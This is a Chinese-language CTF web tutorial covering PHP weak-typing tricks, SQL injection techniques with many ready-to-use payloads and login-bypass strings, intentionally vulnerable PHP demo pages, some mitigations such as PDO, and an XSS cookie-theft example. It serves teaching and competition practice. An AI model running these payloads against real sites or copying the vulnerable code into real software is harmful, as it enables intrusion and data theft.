---
title: Web In CTF
date: 2019-07-14 15:40:14
tags: 
- CTF 
- Web
categories: 
- CTF
---


Web tutorial by WUST-AIS

<!-- more -->

## 常见套路

- 爆破，包括`md5`、爆破随机数、验证码识别等
- 绕`WAF`，包括花式绕`Mysql`、绕文件读取关键词检测之类拦截
- 花式玩弄几个PHP特性，包括弱类型，`strpos`和`===`，反序列化 `destruct`、`\0`截断
- 各种找源码技巧，包括`git`、`svn`、`xxx.php.swp`、`*www*.(zip|tar.gz|rar|7z)`、`xxx.php.bak`
- 文件上传，包括花式文件后缀 `.php345` ，`.inc`， `.phtml`， `.phpt`， `.phps`、各种文件内容检测`<?php`, `<?`,  `<%`,  `<script language=php>`、花式解析漏洞
- `Mysql`类型差异，包括和PHP弱类型类似的特性，`0x`、`0b`、`1e`之类，`varchar`和`integer`相互转换
- `open_basedir`、`disable_functions`花式绕过技巧，包括`dl`、`mail`、`imagick`、`bash`漏洞、`DirectoryIterator`及各种二进制选手插足的方法
- 社工，包括花式查社工库、微博、QQ签名、`whois`
- `windows`特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、`::$DATA`，冒号截断
- XSS，各种浏览器`auditor`绕过、富文本过滤黑白名单绕过、`flash xss`
- XXE，各种XML存在地方（`rss`/`word`/流媒体）、各种XXE利用方法（SSRF、文件读取）
- HTTP协议，花式IP伪造` X-Forwarded-For`/`X-Client-IP`/`X-Real-IP`/`CDN-Src-IP`、花式改UA，花式藏FLAG、花式分析数据包

## 信息泄露

### 查看源代码

在线上CTF赛事的Web题目中，网页源代码是一个很重要的思路来源，按F12或右键查看源代码即可。

### robots.txt

爬虫协议，有时可以通过它看见一些重要的目录。

```
User-agent: *
Disallow: /images/
Disallow: /f1ag.txt/
Disallow: /tips.php
```

### 注释

一般在右键源代码中，有时注释隐藏着重要的信息或者tips，或者出题者写下的思路。

### 备份文件源码泄漏

​	常见备份文件后缀：

- `.rar`

- `.zip`

- `.7z`

- `.tar.gz`

- `.bak`

- `.swp`

- `.txt`

- `.html`

- `linux`中可能以" `~` " 结尾

- `ng`源码泄露，`git`源码泄露，`DS_Store`文件泄漏，网站备份压缩文件，SVN导致文件泄露，WEB-INF/web.xml泄露，CVS泄漏等，可参考以下资料：

  [CTF中常见Web源码泄露总结](https://www.cnblogs.com/xishaonian/p/7628153.html)

  [常见Web源码泄露解析](http://www.s2.sshz.org/post/source-code-leak/)

  [文件泄露](https://zhuanlan.zhihu.com/p/21296806)

### include漏洞

遇到`php`代码中有`include($file)`的，一般和 `php://input`或者`php://filter`有关，​`$file`值如果是`php://input`，就要用post表单构造数据，如果是`php://filter`，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。

```php
php://filter/read=convert.base64-encoding/resource=文件名(如index.php)
php://filter/read=convert.base64-encode/resource=index.php
```

## 抓包/HTTP

### GET&POST

Get和Post操作是传参的基本操作，也是CTF中很常见的常规操作。

GET：在`url`中提交参数，如`/index.php?a=1`

POST：可通过`hackbar`或抓包插入post数据提交

最直接的区别：

GET请求的参数是放在URL里的，POST请求参数是放在请求body里的。

### HTTP头部绕过姿势

- 如果提示需要本地ip或指定ip才能访问，则可在报文头部添加以下几种常用信息段：

  ```http
  X-Forwarded-For: 127.0.0.1
  X-Client-IP: 127.0.0.1
  Client-IP: 127.0.0.1
  (ip地址可以根据需要修改)
  ```

- 如果需要验证网页来源，如一定要从谷歌跳转过来的页面才允许访问，则可在报文头部添加：

  ```http
  Referer: https://www.google.com
  ```

- 如果网页需要验证cookie，我们可以在http头部加入：

  ```http
  Cookie: u = stupid;
  ```

- 除了以上几种常见的情况，还需根据具体情况来使用不同的操作

## 源码审计

### php弱类型

#### == 与 ===

```php
<?php
	$a == $b ;
	$a === $b ;
?>
    
//=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较
// == 在进行比较的时候，会先将字符串类型转化成相同，再比较
```

如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行

```php
<?php
var_dump("admin" == 0); //true
var_dump("1admin"== 1); //true
var_dump("admin1"== 1); //false
var_dump("admin1"== 0); //true
var_dump("0e123456"=="0e4456789"); //true 
?>  //上述代码可自行测试
    
 // 观察上述代码
 //"admin"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等
 //"1admin"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，即是"admin1"被转化成了0,为什么呢？？
 //"0e123456"=="0e456789"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等
```

`php`手册：

```c
/*
当一个字符串当作一个数值来取值，其结果和类型如下:如果该字符串没有包含'.','e','E'并且其数值值在整形的范围之内
该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。
*/
```

```php
<?php
$test=1 + "10.5"; // $test=11.5(float)
$test=1+"-1.3e3"; //$test=-1299(float)
$test=1+"bob-1.3e3";//$test=1(int)
$test=1+"2admin";//$test=3(int)
$test=1+"admin2";//$test=1(int)
?>
    
So that's why " "admin1"==1 =>False "
```

![12ScvV.png](https://s2.ax1x.com/2020/02/07/12ScvV.png)

#### md5绕过(Hash比较缺陷)

```php
<?php
if (isset($_GET['Username']) && isset($_GET['password'])) {
    $logined = true;
    $Username = $_GET['Username'];
    $password = $_GET['password'];

     if (!ctype_alpha($Username)) {$logined = false;}
     if (!is_numeric($password) ) {$logined = false;}
     if (md5($Username) != md5($password)) {$logined = false;}
     if ($logined){
    echo "successful";
      }else{
           echo "login failed!";
        }
    }
?>
```

大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 

介绍一批md5开头是0e的字符串

**0e在比较的时候会将其视作为科学计数法**，所以无论0e后面是什么，0的多少次方还是0。

键入**md5('240610708') == md5('QNKCDZO')**成功绕过！

收集md5开头是0e的字符串（来源于网络）：

```php
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
  
s1885207154a
0e509367213418206700842008763514
```

#### json绕过

```php
<?php
if (isset($_POST['message'])) {
    $message = json_decode($_POST['message']);
    $key ="*********";
    if ($message->key == $key) {
        echo "flag";
    } 
    else {
        echo "fail";
    }
 }
 else{
     echo "~~~~";
 }
?>
```

输入一个json类型的字符串，json_decode函数解成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，**但是可以利用0=="admin"这种形式绕过**.

**最终payload **

````json
message={"key":0}
````

#### array_search is_array绕过

```php
<?php
if(!is_array($_GET['test'])){exit();}
$test=$_GET['test'];
for($i=0;$i<count($test);$i++){
    if($test[$i]==="admin"){
        echo "error";
        exit();
    }
    $test[$i]=intval($test[$i]);
}
if(array_search("admin",$test)===0){
    echo "flag";
}
else{
    echo "false";
}
?>
```

先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag。

```php
payload: test[]=0//可以绕过
```

官方手册对array_search的介绍

```php
mixed array_search ( mixed $needle , array $haystack [], bool $strict = false )
```

$needle，$haystack必需，$strict可选  函数判断$haystack中的值是存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤。

```php
<?php
	$a=array(0,1);
	var_dump(array_search("admin",$a));  // int(0) ==> 返回键值0
	var_dump(array_search("1admin",$a)); // int(1) ==> 返回键值1
?>
```

array_search函数 类似于 == 也就是$a =="admin" 当然是$a=0  当然如果第三个参数为true则就不能绕过。

#### strcmp漏洞绕过 php -v <5.3

```php
<?php
    $password="***************"
     if(isset($_POST['password'])){

        if (strcmp($_POST['password'], $password) == 0) {
            echo "Right!!!login success";n
            exit();
        } else {
            echo "Wrong password..";
        }
 ?>
```

- strcmp是比较两个字符串，如果str1<str2 则返回<0 如果str1大于str2返回>0 如果两者相等 返回0
- 我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢
- 我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等
- payload: password[]=xxx

#### switch绕过

```php
<?php
$a="4admin";
switch ($a) {
    case 1:
        echo "fail1";
        break;
    case 2:
        echo "fail2";
        break;
    case 3:
        echo "fail3";
        break;
    case 4:
        echo "sucess";  //结果输出success;
        break;
    default:
        echo "failall";
        break;
}
?>
```

原理和上面一样

#### is_numeric（）、int()强制类型转换

```php
<?php
show_source(__FILE__);
$flag = "xxxx";
if(isset($_GET['time'])){ 
        if(!is_numeric($_GET['time'])){ 
                echo 'The time must be number.'; 
        }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){ 
                        echo 'This time is too short.'; 
        }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){ 
                        echo 'This time is too long.'; 
        }else{ 
                sleep((int)$_GET['time']); 
                echo $flag; 
        } 
                echo '<hr>'; 
}
?>
```

知识点：

```
int()，不能正确转换的类型有十六进制型字符串、科学计数法型字符串
is_numeric()支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串
```

先判断是不是数字，然后再进行int长短的限定判断，也就是只能限定在5184000L<  time <  7776000

通过is_number() 能传入科学计数法，来进行绕过。

所以根据int不能处理科学计数法，而在is_number上能处理来解决。

#### 

## SQL注入

#### 分类：

按照参数类型分类，按数据库返回的结果分类等。

##### 按照参数类型分类

按照参数类型可以分为两类:数值型、字符型

简单来说，就是：

```sql
数字型注入
加单引号 错误出异常
and 1 = 1 正常
and 1 = 2 异常

字符型注入
加单引号 错误出异常
and '1' = '1 正常
and '1' = '2 异常
```

##### 数值型

程序拼接的变量值没有被引号包裹。数值型注入是无视php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义函数的影响的。如果程序没有对关键字或者特殊符号过滤或者过滤不严(比如没有过滤union、select等关键字,可以使用联合注入,过滤了union、select等关键字,可以用盲注或者报错注入等方法)

eg:

```mysql
CREATE DATABASE IF NOT EXISTS `test`;
CREATE TABLE IF NOT EXISTS `news` (
  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(30) CHARACTER SET utf8 NOT NULL,
  `content` varchar(256) CHARACTER SET utf8 NOT NULL,
  PRIMARY KEY (`tid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

INSERT INTO `news` (`tid`, `title`, `content`) VALUES
(1, '新闻1', '这是第一篇文章'),
(2, '新闻2', '这是第二篇文章');
```



sqlinjection.php(test on mysql 5.5.38)

```php
<?php
session_start();
$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');
mysql_select_db('test', $conn) OR emMsg("连接数据库失败，未找到您填写的数据库");
if (isset($_GET['id'])&&$_GET['id']){
    $id = $_GET['id'];
    $sql = "select * from news where id=$id";
    echo $sql;
    $result = mysql_query($sql, $conn) or die(mysql_error());
}
else{
    $sql = "SELECT * FROM news";
    echo $sql;
    $result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察
}
?>
<!DOCTYPE html>
<html>
<head>
<title>新闻</title>
</head>
<body>
<?php
if (isset($result)){
    while($row = mysql_fetch_row($result, MYSQL_ASSOC)){
        echo "{$row['tid']}    {$row['title']}    {$row['content']}</br>";
    }
}
?>
</body>
</html>
```

如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):

```mysql
http://127.0.0.1/sqlinjection.php?id=1 union select 1,2,user() --
```

没有回显可以尝试下看能不能报错注入,比如:

```mysql
http://127.0.0.1/sqlinjection.php?id=1 or updatexml(2,concat(0x7e,(version())),0) --
```

也可以试下时间盲注,比如:

```mysql
http://127.0.0.1/sqlinjection.php?id=3 and sleep(3) --
```

也可以试下bool盲注(看能不能引起页面变化):

```mysql
http://127.0.0.1/sqlinjection.php?id=3 and (length(database()))>10 --
```

__注__: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)。

__注__: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。

##### 字符型

程序拼接的变量被引号包裹。字符型注入是是受php的gpc或者addslashes、mysql_real_escape_string,mysql_escape_string或者其他对引号有转义的函数影响的。如果程序没有对引号和关键字或者特殊符号过滤或者过滤不严,可能会导致sql注入。

eg:

```php
$p = $_GET['p']; p = 100' and '1'='1
$sql = "select * from news where p = '3' and '1'='2'";
```

闭合单引号,如果使用联合注入测试有回显并且是第三个字段在页面有回显,那么可以使用联合注入(这里假设test表是三个字段):

```mysql
http://xxx/qqq.php?p=1' union select 1,2,user() --
```

闭合单引号,没有回显可以尝试下看能不能报错注入,比如:

```mysql
http://xxx/qqq.php?p=1' or updatexml(2,concat(0x7e,(version())),0) --
```

也可以试下时间盲注,比如:

```mysql
http://xxx/qqq.php?p=1' and sleep(5) --
```

也可以试下bool盲注(看能不能引起页面变化):

```mysql
http://xxx/qqq.php?p=1' and (length(database()))>10 --
```

__注__: 上面的测试是在对应的注入方式中关键字或者特殊符号没有被过滤的情况下,真实环境中也不知道到底过滤了什么或者是其他原因。在不能看到源码的而情况下,也只能fuzz(随机测试)

__注__: 上面这些只是提供大致的思路。联合注入,报错注入,盲注以及其他注入方式有很多,还可以结合编码等或者其他大佬总结的什么方式绕过,需要用到的时候可以搜集资料详细的学习。

##### 按数据库返回的结果分类

据数据库返回的结果,分为回显注入、报错注入、盲注。

##### 回显注入

可以直接在存在注入点的当前页面中获取返回结果,可以使用回显注入。

常见利用:

> union select

##### 报错注入

程序将数据库的返回错误信息直接显示在页面中。虽然没有返回数据库的查询结果,但是可以构造一些报错语句从错误信息中获取想要的结果。

常见利用:

> floor
> updatexml
> extractvalue

##### 盲注

程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。

- bool盲注(based boolean)
  - 如果测试时发现页面有变化,可以尝试使用bool盲注
- 时间盲注(based time)
  - 如果测试时页面无变化,但是通过sleep发现页面存在延迟,可以尝试使用时间盲注

利用:

- Length()、Substr()、Ascii()、sleep()、if(expr1,expr2,expr3)等结合使用



##### 其他特殊注入

##### 宽字节注入

形成条件:

- 开启了`gpc`或使用`addslashes`、`mysql_real_escape_string`、`mysql_escape_string`等对引号转义的函数
- 使用了`SET NAMES 多字节编码`或者`set character_set_client=多字节编码`指令,这里多字节编码低位的范围需要覆盖0x5C才能导致注入。我们最常见的是`gbk`编码。

假如代码中设置的是GBK编码(mysql那端表或者字段设置的编码无影响,会自动转换),这时只要引入宽字节高位编码吃掉`\`(%5c),就导致了宽字节注入的发生。

可以参考[sql注入：宽字节注入(gbk双字节绕过)](https://lyiang.wordpress.com/2015/06/09/sql注入：宽字节注入（gbk双字节绕过）/)

eg:

```mysql
CREATE DATABASE IF NOT EXISTS `test`;
CREATE TABLE IF NOT EXISTS `news` (
  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(30) CHARACTER SET utf8 NOT NULL,
  `content` varchar(256) CHARACTER SET utf8 NOT NULL,
  PRIMARY KEY (`tid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

INSERT INTO `news` (`tid`, `title`, `content`) VALUES
(1, '新闻1', '这是第一篇文章'),
(2, '新闻2', '这是第二篇文章');
```

sqlgbkinjection.php (test on mysql 5.5.38)

```php
<?php
//连接数据库部分，注意使用了gbk编码，把数据库信息填写进去
$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');
mysql_query("SET NAMES 'gbk'");
mysql_select_db('test', $conn) OR emMsg("连接数据库失败，未找到您填写的数据库");
//执行sql语句
$id = isset($_GET['id']) ? addslashes($_GET['id']) : 1;
$sql = "SELECT * FROM news WHERE tid='{$id}'";
$result = mysql_query($sql, $conn) or die(mysql_error()); //sql出错会报错，方便观察
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="gbk" />
<title>新闻</title>
</head>
<body>
<?php
$row = mysql_fetch_array($result, MYSQL_ASSOC);
echo "<h2>{$row['title']}</h2><p>{$row['content']}<p>\n";
mysql_free_result($result);
?>
</body>
</html>
```

测试:
`http://127.0.0.1/sqlgbkinjection.php?id=10%df%27%20union%20select%201,user(),database()%23`

##### 二次注入

首先将构造好的利用代码写入网站保存,再第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞。



比如sql二次注入:

在第一次进行数据库插入数据的时候，仅仅只是使用了` addslashes` 或者是借助 `get_magic_quotes_gpc` 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。

在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。

eg:
数据表使用的是上面news表

secondaryinjection.php (test on mysql 5.5.38)

```php
<?php
error_reporting(0);
session_start();
$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');
mysql_select_db('test', $conn) OR emMsg("连接数据库失败，未找到您填写的数据库");
if (isset($_GET['title'])&&isset($_GET['tid'])&&isset($_GET['content'])){
    $tid = intval($_GET['tid']);
    $title = $_GET['title'];
    $content = $_GET['content'];
    if (!get_magic_quotes_gpc()){
        $title = addslashes($title);
        $content = addslashes($_GET['content']);
    }
    $sql = "INSERT INTO news(tid,title,content) VALUES ($tid,'$title','$content')";
    mysql_query($sql, $conn) or die(mysql_error());

    $sql = "select * from news where tid=$tid";
    echo $sql;
    $results = mysql_query($sql,$conn);
    $row = mysql_fetch_array($results);
    $_SESSION['tid'] = $row['tid'];
    $_SESSION['title'] = $row['title'];
    echo $_SESSION['title'];
}
elseif (isset($_SESSION['title'])){
    $title = $_SESSION['title'];
    $sql = "select * from news where title='$title'";
    echo $sql.'<br>';
    $results = mysql_query($sql, $conn) or die(mysql_error());
    while ($row = mysql_fetch_array($results))
    {
        echo $row['title'].'    '.$row['content'];
        echo '<br>';
    }
}
else{
    echo 'Try create a new';
}
?>
```

`http://127.0.0.1/secondaryinjection.php?tid=6&title=aaa%27 union select 1,user(),3%23&content=qqqqq`

`http://127.0.0.1/secondaryinjection.php`

#### 检测判断sql注入：

```sql
id=1' and 1=0 //报错
id=1' and 1=1 //正确
```

#### 判断什么类型注入：

```sql
id=1'
id=1"
```

可加 “\” 等符号，构造报错，从报错回显中观察是什么类型的错误，如：

```sql
SELECT * from table_name WHERE id='our input'

SELECT * from table_name WHERE id=our input

SELECT * from table_name WHERE id=('out input')

SELECT * from table_name WHERE id=("our input")
```

![12S2uT.png](https://s2.ax1x.com/2020/02/07/12S2uT.png)

原理如上

#### 数据库查询版本

- Mssql: select @@version
- Mysql: select version（）/select @@version
- oracle: select banner from ￥version
- Postgresql: select version（）

#### 判断过滤了哪些字符？

采用异或注入。
在id=1后面输入 '(0)'
发现不出错，那就将0换成1=1
如果出错，那就是成功了

如果括号里面的判断是假的，那么页面就会显示正确
那么同理，
如果修改里面的内容为length(‘union’)!=0
如果页面显示正确，那就证明length(‘union’)==0的，也就是union被过滤了

#### 判断字段长度

- #### order by 数字 可以判断字段的个数
- 也可以用猜字段 union select 1，2，3

```sql
id=1' order by 1
id=1' order by 2
...
id=1' order by n
```

如果n出现了错误那么共有n-1列，union查询必须列数量对齐，也就是说union select 1,2,...,n-1 from ...

#### 判断字段回显位置

在链接后面添加语句`union select 1,2,3,4,5,6,7,8,9,10,11#`进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。

#### 判断数据库注入

利用内置函数暴数据库信息
version()版本；database()数据库；user()用户；
不用猜解可用字段暴数据库信息(有些网站不适用):

```sql
and 1=2 union all select version()
and 1=2 union all select database()
and 1=2 union all select user()
操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user
数据库权限：and ord(mid(user(),1,1))=114 返回正常说明为root
```

#### 绕过登陆验证

- admin’ –
- admin’ #
- admin’/*
- ’ or 1=1–
- ’ or 1=1#
- ’ or 1=1/*
- ') or ‘1’='1–
- ') or (‘1’='1–

#### SQL注入常见函数

- group_concat函数 可以把查询的内容组合成一个字符串
- load_file(file name ) 读取文件并将文件按字符串返回
- left（string，length）返回最左边指定的字符数：
- left（database（），1）>‘s’ (猜名字)
- length（）判断长度
- length（database（）>5
- substr（a，b，c）从字符串a中截取 b到c长度
- ascii（）将某个字符转为ascii值
- ascii（substr（user（），1，1））=101#
- mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）

#### 联合爆库：

这里假设有3列：

为了让联合注入工作，首先要知道数据库中的表名，键入：

```sql
id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ //--+是把语句闭合后注释掉后面的语句
```

有时程序可能不会打印出所有的行，这时我们就得使用关键字limit一条条进行查询，键入：

```sql
id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+
id=-1' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1 --+
```

或者可以用group_concat():

```sql
id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

假设有'users'表

现在看其中的一个表，为了提取其信息，键入：

```sql
id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

注意，我们使用'column'替换了'table'，因为我们想要的是一个表的列信息
假设有'username'，'password'，'flag'列，我们可以键入：

```sql
id=-1' union select 1,group_concat(username),3 from users --+
id=-1' union select 1,group_concat(username),group_concat(password) from users --+
id=-1' union select 1,flag,3 from users --+
```

即可按需查询所需要的信息。



#### 报错注入：

```sql
- floor （SELECT user()可修改）

- OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)–+
  
- ExtractValue(有长度限制,最长32位) （select @@version可修改）
  
  and extractvalue(1, concat(0x7e, (select @@version),0x7e))–+

- UpdateXml(有长度限制,最长32位) （SELECT @@version可修改）

  and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)–+

- NAME_CONST(适用于低版本，不太好用)

- and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)–+

- Error based Double Query Injection

- or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1–+

- exp(5.5.5以上) （select user()可修改）

- and (select exp(~(select * from(select user())x)))–+

- floor(Mysql): and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x 
from information_schema.tables group by x)a);

- Extractvalue(Mysql): and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

- Updatexml(Mysql): and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

- EXP: and exp(~(select * from(select user())a));

- UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(select bannerO from sys.v_$version where rownum=1))

- multipoint(Mysql)：and multipoint((select * from(select * from(select user())a)b));

- polygon(Mysql)：and polygon((select * from(select * from(select user())a)b));

- multipolygon(Mysql)：and multipolygon((select * from(select * from(select 
user())a)b));

- linestring(Mysql)：and linestring((select * from(select * from(select user())a)b));

- multilinestring(Mysql)：and multilinestring((select * from(select * from(select user())a)b));
```



#### bool盲注

- 盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。

- ##### 布尔条件构造

  ```sql
  //正常情况
   'or bool#
   true'and bool#
       
   //不使用空格、注释
   'or(bool)='1
   true'and(bool)='1
       
   //不使用or、and、注释
   '^!(bool)='1
   '=(bool)='
   '||(bool)='1
   true'%26%26(bool)='1
   '=if((bool),1,0)='0
       
   //不使用等号、空格、注释
   'or(bool)<>'0
   'or((bool)in(1))or'0
       
   //其他
   or (case when (bool) then 1 else 0 end)
  ```

- 有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz

  ```sql
   1' or (bool) or '1'='1
   1%' and (bool) or 1=1 and '1'='1
  ```

- ##### 构造逻辑判断

  - 逻辑判断基本就那些函数：

    ```
      left(user(),1)>'r'  
      right(user(),1)>'r'  
      substr(user(),1,1)='r'  
      mid(user(),1,1)='r' 
          
      //不使用逗号 
      user() regexp '^[a-z]'
      user() like 'root%'
      POSITION('root' in user())
      mid(user() from 1 for 1)='r'
      mid(user() from 1)='r'
    ```

- ##### 利用order by盲注

  ```sql
  mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;
  +----+--------------+------------------------
  | id |    username  | password                   
  +----+--------------+------------------------
  |  1 | 2            | 5                         
  |  1 | admin        | 51b7a76d51e70b419f60d34 
  +----+----------- --+------------------------
  2 rows in set (0.00 sec)
      
  mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;
  +-----+-----------+--------------------------
  |id   | username  | password                  
  +-----+-----------+--------------------------
  |  1  | admin     |51b7a76d51e70b419f60d3
  |  1  |    2      | 6                          
  +-----+-----------+--------------------------
  2 rows in set (0.01 sec)
  ```

#### 延时盲注

- 相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。
- 一般格式if((bool),sleep(3),0)和or (case when (bool) then sleep(3) else 0 end)
- 两个函数：
- BENCHMARK(100000,MD5(1))
- sleep(5)
- BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源，推荐使用sleep()。

#### Mysql注释符

```sql
1. -- -
2. /* .... */
3. #
4. `
5. ;%00 
```

#### GBK绕过注入

- 在分号前加%df%27
- 示例：id=1%df%27 union select 1.2–+

#### 实例

以HDWiki v6.0 UTF8-20170209 前台sql注入为例，index.php?doc-create创建词条可以通过`aaaa……aa'` 81个字符，经过转义变成`aaaa……aa\'`82个字符，经过截断变成`aaaa……aa\`81个字符，将sql语句中的单引号转义，并且后面一个参数用户可控，产生了SQL注入

`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'`

`，concat(user(),0x7c,database(),0x7c,version()),1,1,#`

#### 漏洞防范

##### gpc/rutime魔术引号

- magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤
- magic_quotes_runtime对从数据库或者文件中获取的数据进行过滤。上面的二次注入可以使用这个函数对特殊符号转义

开启这两个选项也只能防御部分SQL注入。因为他们只对`'`、`"`、`\`、`空字符`进行转义,在int型注入上没有太大作用。

##### 过滤函数和类

###### addslashes函数

addslashes也是对`'`、`"`、`\`、`空字符`进行转义，大多数程序使用它实在程序入口，判断如果没有没有开启gpc,则使用它对参数进行过滤,不过他的参数必须是string,所以如果参数是数组类型,那么必须使用此函数对数组递归过滤。

###### mysql\_[real]\_escape\_string

mysql_escape_string和mysql_real_escape_string函数都是对字符串进行过滤,在php4.0.3以上版本才有这两个函数,`\x00`、`\n`、`\r`、`\`、`'`、`"`、`\x1a`。不同在于mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转义字符串,所以最好使用mysql_real_escape_string。

mysql_escape_string

```php
$item = "Zak's Laptop";
$escaped_item = mysql_escape_string($item);
```

mysql_real_escape_string

```php
$conn = mysql_connect('localhost', 'root', 'root') or die('bad!');
$item = "Zak's Laptop";
$escaped_item = mysql_real_escape_string($item,$conn);
```

###### intval

将字符转换成数值

eg:

```php
$id = '1 union select';
$id = intval($id);
echo $id;
```

##### PDO预编译方式

使用PDO方式基本可以防止sql注入,原因是因为有两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。但是还是存在特殊情况会在使用了PDO方式也会存在注入,可以参考[https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218](https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218)

eg:

```php
try {
	$pdo = new PDO('mysql:host=localhost;dbname=test', 'root', 'root');
} catch (PDOException $e) {
	echo $e->getMessage();
}
$sta = $pdo->prepare('select * from table where name = ?'); //准备 SQL 模版，其中 ? 代表一个参数。
$sta->execute(array('name1')); //通过数组设置参数，执行 SQL 模版
```



## XSS漏洞

### 成因与危害

参数没有被过滤或严格过滤,且参数传入到了输出函数,被输出到了页面。常出现在文章发表、评论回复、留言、资料修改等地方。

可能产生如下危害:

- 窃取cookie
- 修改页面进行钓鱼
- 前端能做的事情,xss都能做到

### 分类

反射型、存储型、dom型

### 反射型

经过了后端,但是没有经过经过数据库。

数据流向: 浏览器 -> 后端 -> 浏览器

eg:

reflectxss.php(test on mysql 5.5.38)

```php
XSS反射演示
<form action="" method="get">
    <input type="text" name="xss"/>
    <input type="submit" value="test"/>
</form>
<?php
session_start();
$xss = @$_GET['xss'];
if($xss!==null){
    echo $xss;
}
?>
```

`http://127.0.0.1/reflectxss.php?xss=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E`

恶意利用(以获取用户cookie为例):
比如`http://xxx.com/xxx.php?aaa=攻击者编写的获取用户cookie的代码`存在反射型xss,
攻击者可以把构造好的链接发到论坛或者其他方式诱导用户点击,如果用户点击了链接,那么用户的cookie会被攻击者的服务器收到,攻击者可以利用用户的cookie登陆目标网站

### 存储型

数据经过了后端,经过了数据库。

